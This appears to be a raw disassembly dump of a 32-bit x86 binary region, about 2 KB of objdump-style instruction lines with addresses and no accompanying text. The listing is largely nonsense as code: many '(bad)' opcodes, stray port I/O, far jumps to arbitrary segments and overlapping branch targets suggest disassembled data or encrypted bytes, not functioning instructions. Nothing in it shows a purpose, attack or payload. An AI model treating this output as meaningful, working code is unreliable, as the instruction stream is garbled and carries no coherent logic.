  420897:	or     al,0x71
  420899:	xchg   DWORD PTR ds:0x828d21a7,ebx
  42089f:	repnz mov ecx,0x25476cb5
  4208a5:	test   eax,0xb7bee6bf
  4208aa:	ret    
  4208ab:	xor    DWORD PTR [edi+ecx*1+0x23],ecx
  4208af:	mov    DWORD PTR [edi+0x53],edx
  4208b2:	mul    ch
  4208b4:	mov    edx,0x21c1d781
  4208b9:	pop    esp
  4208ba:	jnp    0x420881
  4208bc:	js     0x4208c0
  4208be:	fucom  st(6)
  4208c0:	mul    DWORD PTR [ecx-0x33102fa9]
  4208c6:	jb     0x4208f7
  4208c8:	push   0xca34f315
  4208cd:	repz xor edx,esi
  4208d0:	xchg   ebx,eax
  4208d1:	pop    ds
  4208d2:	loop   0x420948
  4208d4:	jne    0x420939
  4208d6:	xor    BYTE PTR [edx+0x16],ch
  4208d9:	push   ecx
  4208da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208db:	push   0xfc8948c0
  4208e0:	out    dx,al
  4208e1:	dec    ecx
  4208e2:	aaa    
  4208e3:	push   edx
  4208e4:	pop    ebp
  4208e5:	ja     0x420892
  4208e7:	loopne 0x420932
  4208e9:	cmp    dl,BYTE PTR [eax+ebp*1-0x1c]
  4208ed:	mov    eax,ds:0x8a6647a
  4208f2:	pop    ecx
  4208f3:	aas    
  4208f4:	xchg   edx,ecx
  4208f6:	fsub   DWORD PTR [ecx+0x2a]
  4208f9:	cwde   
  4208fa:	aas    
  4208fb:	mov    al,0xa3
  4208fd:	mov    dh,0x13
  4208ff:	pop    ebx
  420900:	xor    eax,0xe98f65d1
  420905:	dec    edi
  420906:	pop    ss
  420907:	push   0x73
  420909:	scas   al,BYTE PTR es:[edi]
  42090a:	test   al,0xbe
  42090c:	cwde   
  42090d:	xchg   edx,eax
  42090e:	scas   eax,DWORD PTR es:[edi]
  42090f:	outs   dx,BYTE PTR ds:[esi]
  420910:	mov    ecx,0x22da139c
  420915:	cmp    al,0xc5
  420917:	ror    BYTE PTR [ecx+0x60],1
  42091a:	arpl   WORD PTR [eax+ecx*2],ax
  42091d:	fwait
  42091e:	xor    al,0xe3
  420920:	inc    ebp
  420921:	and    al,0x21
  420923:	out    dx,al
  420924:	aaa    
  420925:	sbb    BYTE PTR [edi-0x43],bh
  420928:	lods   al,BYTE PTR ds:[esi]
  420929:	mov    eax,ds:0x73ae7941
  42092e:	mov    ebp,0x3e783b6d
  420933:	xor    dh,BYTE PTR [ebx-0x32]
  420936:	push   edx
  420937:	rcr    DWORD PTR [eax-0xeb3d4c9],0xf
  42093e:	adc    al,0xcb
  420940:	jmp    FWORD PTR [ebx+0x47524195]
  420946:	cli    
  420947:	and    ch,BYTE PTR [ecx-0x7d]
  42094a:	pop    edx
  42094b:	jg     0x4209ae
  42094d:	xor    BYTE PTR [ebx+ebx*1+0x273c1d36],dl
  420954:	inc    ecx
  420955:	dec    ebx
  420956:	adc    DWORD PTR [esi+0x61],eax
  420959:	push   es
  42095a:	lahf   
  42095b:	imul   edi
  42095d:	fwait
  42095e:	loop   0x4209da
  420960:	lahf   
  420961:	push   ebp
  420962:	fnsave [esi]
  420964:	jecxz  0x4209c9
  420966:	mov    al,0xee
  420968:	out    0x6e,eax
  42096a:	daa    
  42096b:	out    dx,al
  42096c:	hlt    
  42096d:	add    BYTE PTR [ecx+eax*2],cl
  420970:	mov    al,ds:0x181cace3
  420975:	nop
  420976:	or     BYTE PTR [ebx+0x7a],cl
  420979:	pusha  
  42097a:	call   0x5dce94e6
  42097f:	mov    bh,0x3f
  420981:	sbb    dh,ch
  420983:	lea    ecx,[ecx-0x2c]
  420986:	adc    eax,0x55584364
  42098b:	mov    edi,0x4fa8504e
  420990:	jbe    0x420942
  420992:	lock and al,0xeb
  420995:	jge    0x4209b0
  420997:	xchg   edx,eax
  420998:	iret   
  420999:	fnstenv [eax]
  42099b:	fs mov dl,0xd2
  42099e:	imul   ebx,DWORD PTR [edx-0x37],0x53
  4209a2:	inc    esp
  4209a3:	stos   BYTE PTR es:[edi],al
  4209a4:	outs   dx,BYTE PTR ds:[esi]
  4209a5:	mov    ds:0x30c0429c,al
  4209aa:	adc    BYTE PTR [eax+0x54],0x55
  4209ae:	mov    ecx,0x5193424f
  4209b3:	(bad)
  4209b6:	in     eax,0x77
  4209b8:	fadd   DWORD PTR [ebx-0x263c147b]
  4209be:	retf   0x6ab6
  4209c1:	dec    esp
  4209c2:	mov    dl,ch
  4209c4:	jbe    0x420a2f
  4209c6:	push   ebp
  4209c7:	(bad)  
  4209c8:	mov    esi,0x3440d9e1
  4209cd:	loop   0x420a2d
  4209cf:	cld    
  4209d0:	shl    al,0x9f
  4209d3:	xor    eax,DWORD PTR [esi-0x4e]
  4209d6:	out    0x4b,al
  4209d8:	mov    edx,DWORD PTR [edx+0x69448905]
  4209de:	xor    eax,DWORD PTR [ecx]
  4209e0:	rcl    BYTE PTR ds:0x768e5f7c,0x8e
  4209e7:	(bad)  
  4209e8:	call   0xf4ff9a2b
  4209ed:	sbb    BYTE PTR [ebp+0x77],bl
  4209f0:	outs   dx,DWORD PTR ds:[esi]
  4209f1:	inc    esp
  4209f2:	jmp    0x420975
  4209f4:	dec    ebp
  4209f5:	bound  esp,QWORD PTR [ebp+0x4d]
  4209f8:	pusha  
  4209f9:	sub    al,0x39
  4209fb:	xor    DWORD PTR [ebx+0x9690a77],ebx
  420a01:	or     cl,BYTE PTR [ecx+ebp*1+0x2d]
  420a05:	scas   al,BYTE PTR es:[edi]
  420a06:	mov    edx,0xb6ff066d
  420a0b:	daa    
  420a0c:	fild   WORD PTR ds:0x32b9ca1d
  420a12:	pop    edx
  420a13:	dec    eax
  420a14:	stos   DWORD PTR es:[edi],eax
  420a15:	scas   al,BYTE PTR es:[edi]
  420a16:	xor    ecx,DWORD PTR [edi*8-0x286d6b83]
  420a1d:	inc    ecx
  420a1e:	lahf   
  420a1f:	enter  0xc2ce,0xe8
  420a23:	jmp    FWORD PTR [ecx]
  420a25:	(bad)
  420a29:	add    DWORD PTR [ebx+edx*4-0x27d8331f],esi
  420a30:	fadd   DWORD PTR [edx+eiz*2]
  420a33:	fld    DWORD PTR [ebp-0x6bfc72fb]
  420a39:	lods   eax,DWORD PTR ds:[esi]
  420a3a:	clc    
  420a3b:	fld    DWORD PTR [eax-0x6c]
  420a3e:	mov    ah,0x18
  420a40:	push   ds
  420a41:	lods   al,BYTE PTR ds:[esi]
  420a42:	adc    ebp,esi
  420a44:	ja     0x420a59
  420a46:	xlat   BYTE PTR ds:[ebx]
  420a47:	out    dx,al
  420a48:	loope  0x420a92
  420a4a:	jmp    0x4209e4
  420a4c:	pop    edx
  420a4d:	popa   
  420a4e:	add    eax,DWORD PTR [ecx]
  420a50:	xchg   BYTE PTR [eax+0x4c51527c],ch
  420a56:	xor    eax,0xfc175b10
  420a5b:	sbb    al,0x3d
  420a5d:	or     eax,0xe4e460c
  420a62:	clc    
  420a63:	xlat   BYTE PTR ds:[ebx]
  420a64:	cmp    eax,0xdd4c2dae
  420a69:	loop   0x420a0e
  420a6b:	pop    ss
  420a6c:	rcr    BYTE PTR [edx-0x325a655e],1
  420a72:	sub    al,0xd3
  420a74:	fbstp  TBYTE PTR [ecx]
  420a76:	adc    DWORD PTR [ecx+0x354f4557],eax
  420a7c:	xchg   ebx,eax
  420a7d:	ss call 0x325c:0x3e0ec9e3
  420a85:	ret    0xb123
  420a88:	aaa    
  420a89:	and    esp,DWORD PTR [edi+eax*8]
  420a8c:	fwait
  420a8d:	outs   dx,DWORD PTR ds:[esi]
  420a8e:	or     BYTE PTR [edi-0x1e],cl
  420a91:	sub    ah,BYTE PTR [ecx]
  420a93:	sbb    eax,0xdc92d418
  420a98:	pmaxub mm7,QWORD PTR [edx+0x47]
  420a9c:	mov    gs,WORD PTR [ebx+esi*1]
  420a9f:	and    al,0x70
  420aa1:	pop    edx
  420aa2:	xchg   ecx,eax
  420aa3:	add    eax,0x9ec76ee9
  420aa8:	sti    
  420aa9:	ja     0x420ac6
  420aab:	sbb    eax,0xcbb8a8c3
  420ab0:	mul    BYTE PTR [ecx+0x6f]
  420ab3:	call   0x1830:0xbc91652f
  420aba:	dec    edi
  420abb:	fiadd  WORD PTR [edi+eax*2]
  420abe:	cmp    ebp,edi
  420ac0:	pop    ss
  420ac1:	icebp  
  420ac2:	aad    0x87
  420ac4:	rcl    DWORD PTR [esi],1
  420ac6:	iret   
  420ac7:	sbb    DWORD PTR [edi+0x3d],edi
  420aca:	jg     0x420a76
  420acc:	js     0x420b1c
  420ace:	push   esp
  420acf:	sbb    DWORD PTR [ecx+0x53d84ee5],edi
  420ad5:	das    
  420ad6:	fdivp  st(1),st
  420ad8:	int    0xd4
  420ada:	jmp    0x420aea
  420adc:	scas   al,BYTE PTR es:[edi]
  420add:	sub    DWORD PTR [ecx-0x52],0x39
  420ae1:	(bad)  
  420ae2:	aad    0xc
  420ae4:	dec    ebp
  420ae5:	aaa    
  420ae6:	in     al,0xaa
  420ae8:	test   cl,al
  420aea:	jmp    0xbde0:0xdfb55eb7
  420af1:	je     0x420a78
  420af3:	out    0x9,eax
  420af5:	cld    
  420af6:	xchg   ebp,eax
  420af7:	add    bl,0x55
  420afa:	mov    al,0x26
  420afc:	leave  
  420afd:	push   esp
  420afe:	and    eax,0xc73a830b
  420b03:	xor    BYTE PTR [ebx+0x3a],bl
  420b06:	pop    ecx
  420b07:	loope  0x420b5b
  420b09:	push   0xebd22ea0
  420b0e:	leave  
  420b0f:	repz xchg ebx,eax
  420b11:	adc    edx,DWORD PTR [eax+0x7e6f1480]
  420b17:	jo     0x420b18
  420b19:	fdiv   st,st(4)
  420b1b:	hlt    
  420b1c:	ins    BYTE PTR es:[edi],dx
  420b1d:	pop    es
  420b1e:	imul   eax,DWORD PTR [edx],0x33a31713
  420b24:	shl    eax,1
  420b26:	inc    edx
  420b27:	mov    ah,BYTE PTR [ebx]
  420b29:	xchg   BYTE PTR [edi+0x6050ea77],bl
  420b2f:	rol    BYTE PTR [edi],cl
  420b31:	data16 mov ch,0xe3
  420b34:	sub    eax,esp
  420b36:	or     eax,0x5df7be0a
  420b3b:	or     edx,DWORD PTR [esi+edx*8+0xb50022d]
  420b42:	pop    DWORD PTR [ecx+0x7e40e5be]
  420b48:	and    ecx,edi
  420b4a:	test   BYTE PTR [ebp+0x7c],dl
  420b4d:	push   ebx
  420b4e:	or     BYTE PTR [edx+0x3c],0xa7
  420b52:	push   ebx
  420b53:	jp     0x420b2e
  420b55:	xor    bh,BYTE PTR [ebx]
  420b57:	or     dl,BYTE PTR [edi]
  420b59:	and    eax,0x8e19a06a
  420b5e:	xor    DWORD PTR [eax-0x57],ebx
  420b61:	dec    edx
  420b62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b63:	mov    cl,0x95
  420b65:	xchg   esi,eax
  420b66:	mov    ah,0xd5
  420b68:	mov    al,ds:0xa328954d
  420b6d:	out    dx,eax
  420b6e:	mov    ebp,0x8fe70fb9
  420b73:	mov    edi,0x63df75d9
  420b78:	push   esp
  420b79:	ret    
  420b7a:	clc    
  420b7b:	mov    ah,0x12
  420b7d:	xor    DWORD PTR [ebp+0x1823f527],eax
  420b83:	mov    dh,0xeb
  420b85:	jne    0x420b78
  420b87:	repz (bad) 
  420b89:	in     eax,0xa8
  420b8b:	or     BYTE PTR [ebx+esi*2-0x35],ch
  420b8f:	jmp    0x7572f9a9
  420b94:	sbb    al,0x0
  420b96:	fsub   QWORD PTR [edx+0x36612467]
  420b9c:	in     al,0x8c
  420b9e:	sub    BYTE PTR [ecx+0x7a08c882],ah
  420ba4:	sar    DWORD PTR [ecx+0x14],0x81
  420ba8:	pop    edx
  420ba9:	inc    esi
  420baa:	test   BYTE PTR [ebp-0x417a171],bl
  420bb0:	scas   eax,DWORD PTR es:[edi]
  420bb1:	sub    dl,BYTE PTR [esi-0xcf16a8c]
  420bb7:	mov    ds:0x5ee7ad5b,eax
  420bbc:	fiadd  DWORD PTR [ebp+0x59f2efa8]
  420bc2:	call   0x9127:0xed972bd8
  420bc9:	gs inc eax
  420bcb:	mov    BYTE PTR [ebx],cl
  420bcd:	mov    eax,ds:0xe6bce42d
  420bd2:	ins    DWORD PTR es:[edi],dx
  420bd3:	pop    es
  420bd4:	enter  0x1640,0xc0
  420bd8:	add    al,0x6c
  420bda:	adc    al,0x84
  420bdc:	pop    edx
  420bdd:	sub    BYTE PTR [ecx],ch
  420bdf:	xor    BYTE PTR [eax-0xd],0xd3
  420be3:	jmp    DWORD PTR [ebx+0x1766ad05]
  420be9:	imul   esp,edi,0xffffff9f
  420bec:	repnz stc 
  420bee:	add    BYTE PTR [esi-0x16],bh
  420bf1:	sbb    eax,0x1cbb297e
  420bf6:	(bad)  
  420bf7:	jp     0x420be1
  420bf9:	pusha  
  420bfa:	aaa    
  420bfb:	dec    ebp
  420bfc:	add    eax,0x8a20cc9b
  420c01:	mov    bh,0xb3
  420c03:	sbb    DWORD PTR [ebp+0x3fe6ca98],0xc70e0a76
  420c0d:	jmp    0x5929:0xdfe8b034
  420c14:	push   edi
  420c15:	or     eax,0xe14d9a4f
  420c1a:	xchg   edx,eax
  420c1b:	(bad)  
  420c1c:	xchg   esi,eax
  420c1d:	pop    esi
  420c1e:	pop    ds
  420c1f:	mov    ch,BYTE PTR ss:[eax+0x52]
  420c23:	(bad)  
  420c24:	pushf  
  420c25:	pop    es
  420c26:	imul   ebx,DWORD PTR [edx-0x28fbbef4],0x18c40758
  420c30:	(bad)  
  420c31:	fisub  DWORD PTR [ebp+0xab84578]
  420c37:	inc    esp
  420c38:	jne    0x420c71
  420c3a:	dec    edi
  420c3b:	inc    ecx
  420c3c:	xor    al,0x20
  420c3e:	das    
  420c3f:	jle    0x420c37
  420c41:	(bad)  [ecx-0x4963dd60]
  420c47:	mov    eax,ds:0x75f9909d
  420c4c:	in     eax,0x1d
  420c4e:	shr    DWORD PTR [edi-0x7257d0a7],1
  420c54:	dec    ecx
  420c55:	cmp    DWORD PTR [eax],esp
  420c57:	fimul  DWORD PTR [edx-0x441c26ad]
  420c5d:	jge    0x420c4f
  420c5f:	fs pop esi
  420c61:	mov    dl,0xef
  420c63:	adc    cl,BYTE PTR [ecx-0x6985cc84]
  420c69:	loopne 0x420c5d
  420c6b:	xor    edx,eax
  420c6d:	xlat   BYTE PTR ds:[ebx]
  420c6e:	push   eax
  420c6f:	data16 (bad) 
  420c71:	cmc    
  420c72:	jmp    0x420c90
  420c74:	cs or  al,0x47
  420c77:	cwde   
  420c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c79:	sbb    dl,BYTE PTR [ebp+0x56286c79]
  420c7f:	mov    ecx,0x6f0317a8
  420c84:	loope  0x420ce0
  420c86:	shl    bh,0x8d
  420c89:	sbb    eax,0xb550ce4f
  420c8e:	hlt    
  420c8f:	pop    ds
  420c90:	mov    cl,BYTE PTR [ebx]
  420c92:	push   ds
  420c93:	fcom   DWORD PTR [esi+0x11]
  420c96:	div    DWORD PTR [ecx+0x34]
  420c99:	rcl    BYTE PTR [edx+0x31],1
  420c9c:	retf   
  420c9d:	jo     0x420cc4
  420c9f:	xchg   ebp,eax
  420ca0:	push   ebp
  420ca1:	push   ecx
  420ca2:	mov    bl,0x7b
  420ca4:	sti    
  420ca5:	xchg   esi,eax
  420ca6:	pop    edx
  420ca7:	(bad)  
  420ca8:	jno    0x420cff
  420caa:	adc    al,0x92
  420cac:	inc    BYTE PTR [ebx+0x2764ba16]
  420cb2:	mov    al,ds:0xcd8d3c13
  420cb7:	outs   dx,DWORD PTR ds:[esi]
  420cb8:	imul   esp,DWORD PTR [ebp+0x1f9b0b10],0x28
  420cbf:	add    BYTE PTR [ebx+edi*2-0x7c],bh
  420cc3:	sahf   
  420cc4:	imul   ebp,DWORD PTR [esi],0x7d7acb7a
  420cca:	inc    eax
  420ccb:	fwait
  420ccc:	xchg   esi,eax
  420ccd:	xlat   BYTE PTR ds:[ebx]
  420cce:	xchg   edx,eax
  420ccf:	mov    ds:0x9d275c3,eax
  420cd4:	and    esp,DWORD PTR [eax]
  420cd6:	push   ebp
  420cd7:	mov    esp,0xc53635f2
  420cdc:	push   0x3d
  420cde:	data16 sub al,0xe5
  420ce1:	inc    edi
  420ce2:	scas   al,BYTE PTR es:[edi]
  420ce3:	mov    ebp,0x1b859ed6
  420ce8:	int3   
  420ce9:	cmp    eax,0x452397f0
  420cee:	cmp    dl,BYTE PTR [esi-0x7c668555]
  420cf4:	dec    eax
  420cf5:	xor    edx,DWORD PTR [esi]
  420cf7:	out    0x2e,al
  420cf9:	mov    al,0x8a
  420cfb:	popa   
  420cfc:	inc    esi
  420cfd:	mov    eax,0x873c0a98
  420d02:	retf   
  420d03:	or     eax,0x638028fb
  420d08:	ds mov eax,0x1a32af4f
  420d0e:	jbe    0x420cee
  420d10:	jmp    0x67d:0xc0e7747e
  420d17:	sub    esp,DWORD PTR [edx+0x715300b3]
  420d1d:	mov    bh,0x65
  420d1f:	scas   eax,DWORD PTR es:[edi]
  420d20:	jno    0x420d77
  420d22:	sti    
  420d23:	xchg   edi,eax
  420d24:	ret    
  420d25:	xchg   esp,eax
  420d26:	jp     0x420cc0
  420d28:	icebp  
  420d29:	jecxz  0x420d74
  420d2b:	inc    ebx
  420d2c:	xchg   ebp,eax
  420d2d:	or     cl,dh
  420d2f:	int3   
  420d30:	imul   esi,ebp,0xfffffff9
  420d33:	mov    ds:0x8740ae27,eax
  420d38:	cs xchg ebx,eax
  420d3a:	iret   
  420d3b:	outs   dx,DWORD PTR ds:[esi]
  420d3c:	imul   ebx,esi,0xa55452a6
  420d42:	mov    DWORD PTR [esi-0x10a3bcf5],eax
  420d48:	hlt    
  420d49:	(bad)  
  420d4a:	push   DWORD PTR [edx+0x5c9a20e6]
  420d50:	(bad)  
  420d51:	loopne 0x420d9a
  420d53:	fmul   st(1),st
  420d55:	test   DWORD PTR [ecx-0x7b],0x6f1f03d0
  420d5c:	fbstp  TBYTE PTR [eax-0x68]
  420d5f:	push   ss
  420d60:	mov    bl,bl
  420d62:	in     eax,0x75
  420d64:	cmp    DWORD PTR [eax-0x4fd16028],ebx
  420d6a:	fild   QWORD PTR [eax]
  420d6c:	in     al,dx
  420d6d:	xchg   edi,eax
  420d6e:	and    al,0xc2
  420d70:	out    dx,al
  420d71:	enter  0x836b,0x7d
  420d75:	and    bh,BYTE PTR [eax]
  420d77:	push   esp
  420d78:	cmp    al,0xd5
  420d7a:	(bad)  
  420d7c:	mov    ch,0x8a
  420d7e:	mov    bh,0xf7
  420d80:	sbb    BYTE PTR [ebp-0x32],0xc4
  420d84:	test   al,0x2
  420d86:	popa   
  420d87:	popa   
  420d88:	mov    ah,0x2c
  420d8a:	aaa    
  420d8b:	mov    ecx,ebx
  420d8d:	sti    
  420d8e:	xor    DWORD PTR [esi+ecx*2+0x3c286349],ebp
  420d95:	inc    ecx
  420d96:	leave  
  420d97:	xchg   BYTE PTR [ecx],cl
  420d99:	sub    al,0xec
  420d9b:	adc    al,0x25
  420d9d:	sub    al,0x26
  420d9f:	mov    al,ds:0xae4f9821
  420da4:	int3   
  420da5:	add    eax,0x33bdcdbe
  420daa:	push   cs
  420dab:	pusha  
  420dac:	rcl    BYTE PTR [edx+0x3],cl
  420daf:	js     0x420dae
  420db1:	sbb    al,0xf6
  420db3:	out    dx,eax
  420db4:	retf   
  420db5:	mov    edi,0xec3a018b
  420dba:	mov    DWORD PTR [edx+0x3e],0x581a23ee
  420dc1:	lock or ebx,esi
  420dc4:	inc    esp
  420dc5:	ins    BYTE PTR es:[edi],dx
  420dc6:	fs mov ecx,0x9949ecef
  420dcc:	add    BYTE PTR [esi-0x41],0x94
  420dd0:	jmp    0x106d:0xc9c6614b
  420dd7:	dec    ecx
  420dd8:	dec    edx
  420dd9:	push   edi
  420dda:	push   ecx
  420ddb:	test   al,0xc3
  420ddd:	pop    eax
  420dde:	loope  0x420e44
  420de0:	mov    dh,BYTE PTR [ebx+0x78]
  420de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420de4:	pop    ecx
  420de5:	arpl   sp,bp
  420de7:	test   BYTE PTR [ecx],bh
  420de9:	lds    esp,FWORD PTR [ebp-0x7532f765]
  420def:	add    edx,DWORD PTR [edi-0x4fa20775]
  420df5:	mov    ch,al
  420df7:	nop
  420df8:	inc    ebx
  420df9:	and    dl,bl
  420dfb:	xor    al,0x4e
  420dfd:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  420dff:	mov    ch,0xd5
  420e01:	pop    esi
  420e02:	and    BYTE PTR [eax],al
  420e04:	test   DWORD PTR [eax],0xf95c409c
  420e0a:	mov    bl,0x80
  420e0c:	add    al,0x8
  420e0e:	pop    esi
  420e0f:	stc    
  420e10:	(bad)  
  420e11:	mov    ecx,0x69f75693
  420e16:	pop    eax
  420e17:	inc    DWORD PTR [edx]
  420e19:	adc    al,0xe7
  420e1b:	fimul  DWORD PTR [eax-0x4f]
  420e1e:	mov    eax,DWORD PTR [ecx+edx*1-0x1facbe73]
  420e25:	cmp    edx,DWORD PTR ds:0x6382f9e3
  420e2b:	dec    ecx
  420e2c:	pop    ds
  420e2d:	cmp    BYTE PTR [edi],al
  420e2f:	fsub   st(1),st
  420e31:	cmp    eax,0x28da93da
  420e36:	loopne 0x420e1c
  420e38:	xor    BYTE PTR [eax+0x70],0x5
  420e3c:	retf   
  420e3d:	sbb    eax,0x91aaeaec
  420e42:	or     eax,0x2d2d8f4b
  420e47:	push   ebp
  420e48:	daa    
  420e49:	rcl    DWORD PTR [edi-0x9],1
  420e4c:	inc    edx
  420e4d:	cmp    ah,BYTE PTR [edx]
  420e4f:	fistp  WORD PTR [edi-0x6131a84e]
  420e55:	(bad)  
  420e56:	xor    esp,DWORD PTR [ebx+edi*1-0x9]
  420e5a:	repnz xchg ebp,eax
  420e5c:	fld    st(6)
  420e5e:	lds    edi,FWORD PTR [edi]
  420e60:	push   ss
  420e61:	psubq  mm7,QWORD PTR [edx]
  420e64:	imul   ebx,DWORD PTR [esp+edi*2+0x24],0xbf156334
  420e6c:	rcl    DWORD PTR [esi+0x61],1
  420e6f:	mov    ds:0x4fccaa4a,eax
  420e74:	pop    esp
  420e75:	sbb    DWORD PTR [esi-0x6b],ebp
  420e78:	xchg   esp,eax
  420e79:	idiv   BYTE PTR [eax-0x7b8fc1be]
  420e7f:	push   edx
  420e80:	cmp    bl,BYTE PTR [edx+0x432fb56e]
  420e86:	cmp    eax,0x125d3fc0
  420e8b:	adc    esi,DWORD PTR [ebx+0xc]
  420e8e:	pop    edx
  420e8f:	scas   al,BYTE PTR es:[edi]
  420e90:	jecxz  0x420e99
  420e92:	dec    ebp
  420e93:	rcl    BYTE PTR [edx-0x30],cl
  420e96:	cmp    BYTE PTR [edi],bl
  420e98:	sub    BYTE PTR [eax+0xe554b75],0x35
  420e9f:	out    0xc9,eax
  420ea1:	jl     0x420e95
  420ea3:	ja     0x420ebe
  420ea5:	iret   
  420ea6:	cmp    BYTE PTR [edi+edx*2],bl
  420ea9:	xchg   esp,eax
  420eaa:	inc    ecx
  420eab:	call   0x75ac:0x1371303
  420eb2:	xchg   esp,eax
  420eb3:	daa    
  420eb4:	push   0xffffffea
  420eb6:	fsubr  DWORD PTR es:[edx]
  420eb9:	(bad)  
  420eba:	es out dx,al
  420ebc:	sub    eax,DWORD PTR ds:0x2739fde5
  420ec2:	add    eax,0xd5f5475d
  420ec7:	iret   
  420ec8:	sub    dh,BYTE PTR [ebp-0x24e34820]
  420ece:	imul   ebx,DWORD PTR [edi-0x4f],0x9
  420ed2:	jp     0x420e7a
  420ed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ed5:	jp     0x420f45
  420ed7:	mov    eax,ds:0xa77cdf00
  420edc:	adc    eax,0x6a717405
  420ee1:	pop    ecx
  420ee2:	pop    edi
  420ee3:	or     ecx,eax
  420ee5:	sub    eax,0x94354f39
  420eea:	daa    
  420eeb:	inc    edi
  420eec:	mov    cs,ebx
  420eee:	mov    ah,0xdc
  420ef0:	stos   DWORD PTR es:[edi],eax
  420ef1:	push   es
  420ef2:	xchg   ebx,eax
  420ef3:	arpl   WORD PTR [esi+edi*4+0x1fb1c379],si
  420efa:	sti    
  420efb:	adc    ebp,esi
  420efd:	xchg   esi,eax
  420efe:	pop    edx
  420eff:	frstor [ebx+eiz*4-0xd]
  420f03:	sbb    bh,0xb1
  420f06:	cwde   
  420f07:	push   edi
  420f08:	adc    dl,BYTE PTR [esi]
  420f0a:	mov    esi,0x669ad616
  420f0f:	pop    esp
  420f10:	stos   DWORD PTR es:[edi],eax
  420f11:	sub    edx,DWORD PTR ds:0xe0e2e8c3
  420f17:	push   cs
  420f18:	jns    0x420ee7
  420f1a:	aas    
  420f1b:	outs   dx,DWORD PTR ds:[esi]
  420f1c:	imul   eax,DWORD PTR [ecx+0x57b7844d],0x3a
  420f23:	sub    dl,BYTE PTR [ecx-0x30e0cb54]
  420f29:	mov    ds:0x667f0b3e,al
  420f2e:	icebp  
  420f2f:	xchg   DWORD PTR [esi-0x80],ebp
  420f32:	cmp    bh,BYTE PTR [eax+edi*2]
  420f35:	pop    ds
  420f36:	add    esi,DWORD PTR [ebx+esi*4+0x29]
  420f3a:	in     eax,0xb
  420f3c:	iret   
  420f3d:	sbb    BYTE PTR [ecx+ebp*2],cl
  420f40:	push   ebp
  420f41:	out    dx,eax
  420f42:	fisubr WORD PTR [edx+0x14]
  420f45:	sub    edi,0xffffffb0
  420f48:	std    
  420f49:	pop    ss
  420f4a:	pop    ecx
  420f4b:	cli    
  420f4c:	cmp    BYTE PTR [ecx+0x5868c031],ch
  420f52:	bound  ecx,QWORD PTR [edx-0x23175260]
  420f58:	mov    dh,0xe8
  420f5a:	sub    ecx,DWORD PTR [edx+0x3b4c0212]
  420f60:	data16 jnp 0x420fcf
  420f63:	xor    eax,0x5b967377
  420f68:	popa   
  420f69:	jb     0x420fe6
  420f6b:	dec    esp
  420f6c:	adc    DWORD PTR [eax-0x24],0xffffff84
  420f70:	and    BYTE PTR [ecx],bl
  420f72:	and    ch,BYTE PTR [edx+0x30b6d415]
  420f78:	mov    ebx,0xd6f0033e
  420f7d:	xchg   ebp,eax
  420f7e:	mov    eax,0xc670b4eb
  420f83:	push   0x81b7e7bc
  420f88:	les    eax,FWORD PTR [eax]
  420f8a:	pop    edi
  420f8b:	sbb    DWORD PTR [edx-0x1c],esp
  420f8e:	jne    0x420f11
  420f90:	fld    DWORD PTR [esi+0x7d148f39]
  420f96:	xchg   esi,eax
  420f97:	(bad)  
  420f99:	or     dl,al
  420f9b:	int    0x8c
  420f9d:	cmp    eax,DWORD PTR [ebx]
  420f9f:	iret   
  420fa0:	(bad)  
  420fa1:	adc    al,0xd5
  420fa3:	es push ss
  420fa5:	nop
  420fa6:	push   0xfffffffa
  420fa8:	fist   WORD PTR [edx]
  420faa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fab:	je     0x420f71
  420fad:	das    
  420fae:	push   ebp
  420faf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fb0:	call   0x348e76d7
  420fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fb6:	(bad)  
  420fb8:	jno    0x420f52
  420fba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fbb:	repnz lods al,BYTE PTR ds:[esi]
  420fbd:	jae    0x420f64
  420fbf:	and    eax,0xcd6ede56
  420fc4:	add    DWORD PTR ds:0x66b2b607,ecx
  420fca:	fistp  DWORD PTR [edi]
  420fcc:	ss scas eax,DWORD PTR es:[edi]
  420fce:	inc    ebp
  420fcf:	and    al,0xfc
  420fd1:	mov    ebx,0x46656d44
  420fd6:	xor    eax,0x49c39a54
  420fdb:	pop    edi
  420fdc:	cmp    esi,DWORD PTR [eax]
  420fde:	popa   
  420fdf:	call   FWORD PTR [eax+0x1db62f56]
  420fe5:	(bad)
  420fe9:	out    0x6b,al
  420feb:	mov    DWORD PTR ds:0x4af0c04,edx
  420ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ff2:	add    al,0xcd
  420ff4:	cld    
  420ff5:	popf   
  420ff6:	sub    BYTE PTR [edx+0x3b],bl
  420ff9:	test   al,0x12
  420ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ffc:	push   esp
  420ffd:	cmc    
  420ffe:	push   cs
  420fff:	add    DWORD PTR [edx+ebx*8],0xc2a3b604
  421006:	xor    al,0x48
  421008:	retf   0xb511
  42100b:	pop    es
  42100c:	inc    esp
  42100d:	nop
  42100e:	cmp    edi,DWORD PTR [ebx-0x5f]
  421011:	pop    esi
  421012:	into   
  421013:	add    DWORD PTR [edx+edx*2],0x4e
  421017:	mov    ebp,0xf0ff902b
  42101c:	pushf  
  42101d:	call   0x65da55f6
  421022:	jmp    0x420fcb
  421024:	in     al,0xf2
  421026:	test   bl,0x36
  421029:	call   0x1440:0xec75577d
  421030:	outs   dx,DWORD PTR ds:[esi]
  421031:	mov    dl,0xbf
  421033:	cmp    esi,DWORD PTR [esi+0x6a]
  421036:	gs (bad) 
  421038:	fcmovb st,st(4)
  42103a:	outs   dx,BYTE PTR ds:[esi]
  42103b:	sbb    cl,BYTE PTR [edx+esi*1+0x5a574975]
  421042:	aam    0x12
  421044:	retf   0xde08
  421047:	in     al,0xf5
  421049:	cmp    ecx,DWORD PTR [edi-0xc]
  42104c:	jle    0x42103e
  42104e:	pusha  
  42104f:	cmp    DWORD PTR [ebx],esp
  421051:	hlt    
  421052:	jbe    0x421022
  421054:	push   ebx
  421055:	sub    DWORD PTR [edx+0x37],eax
